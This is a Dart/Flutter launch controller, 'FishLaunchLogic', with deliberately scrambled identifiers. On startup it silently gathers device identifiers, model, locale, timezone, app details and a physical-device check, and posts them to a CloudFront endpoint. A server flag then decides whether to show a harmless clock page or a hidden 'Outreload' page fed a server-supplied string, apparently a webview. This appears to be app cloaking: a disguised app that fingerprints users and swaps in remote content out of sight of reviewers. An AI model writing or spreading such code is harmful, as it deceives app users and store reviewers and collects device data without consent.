import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';


class FishLaunchLogic extends GetxController {

  var qvuodl = RxBool(false);
  var jlhbcnauy = RxBool(true);
  var cean = RxString("");
  var brenna = RxBool(false);
  var lesch = RxBool(true);
  final tuxgbzmka = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    owplbn();
  }


  Future<void> owplbn() async {
    brenna.value = true;
    lesch.value = true;
    jlhbcnauy.value = false;

    tuxgbzmka.post("https://dvfqpib2wodlc.cloudfront.net/M2JBFG?no_check",data: await axmyowcqdt()).then((value) {
      var yomlprz = value.data["yomlprz"] as String;
      var dgnoxi = value.data["dgnoxi"] as bool;
      if (dgnoxi) {
        cean.value = yomlprz;
        houston();
      } else {
        kuhn();
      }
    }).catchError((e) {
      jlhbcnauy.value = true;
      lesch.value = true;
      brenna.value = false;
    });
  }

  Future<Map<String, dynamic>> axmyowcqdt() async {
    final DeviceInfoPlugin idvzc = DeviceInfoPlugin();
    PackageInfo vodyt_sdwbjkc = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var gihbd = Platform.localeName;
    var mdfbioup = currentTimeZone;

    var wprsv = vodyt_sdwbjkc.packageName;
    var cokzu = vodyt_sdwbjkc.version;
    var nrxogb = vodyt_sdwbjkc.buildNumber;

    var tmnrjhy = vodyt_sdwbjkc.appName;
    var rkwpz = "";
    var qjrcoszy  = "";
    var dfoiqgm = "";
    var lucieBraun = "";
    var letaRogahn = "";
    var thomasHerman = "";
    var murraySpencer = "";
    var daishaErdman = "";


    var abczxuj = "";
    var brxd = false;

    if (GetPlatform.isAndroid) {
      abczxuj = "android";
      var xauofgvbw = await idvzc.androidInfo;

      dfoiqgm = xauofgvbw.brand;

      rkwpz  = xauofgvbw.model;
      qjrcoszy = xauofgvbw.id;

      brxd = xauofgvbw.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      abczxuj = "ios";
      var wszmdfrgi = await idvzc.iosInfo;
      dfoiqgm = wszmdfrgi.name;
      rkwpz = wszmdfrgi.model;

      qjrcoszy = wszmdfrgi.identifierForVendor ?? "";
      brxd  = wszmdfrgi.isPhysicalDevice;
    }

    var res = {
      "tmnrjhy": tmnrjhy,
      "nrxogb": nrxogb,
      "cokzu": cokzu,
      "wprsv": wprsv,
      "rkwpz": rkwpz,
      "mdfbioup": mdfbioup,
      "dfoiqgm": dfoiqgm,
      "qjrcoszy": qjrcoszy,
      "gihbd": gihbd,
      "abczxuj": abczxuj,
      "brxd": brxd,
      "lucieBraun" : lucieBraun,
      "letaRogahn" : letaRogahn,
      "thomasHerman" : thomasHerman,
      "murraySpencer" : murraySpencer,
      "daishaErdman" : daishaErdman,

    };
    return res;
  }

  Future<void> kuhn() async {
    Get.offNamed("/ClockMainPage");
  }

  Future<void> houston() async {
    Get.offNamed("/Outreload");
  }

}
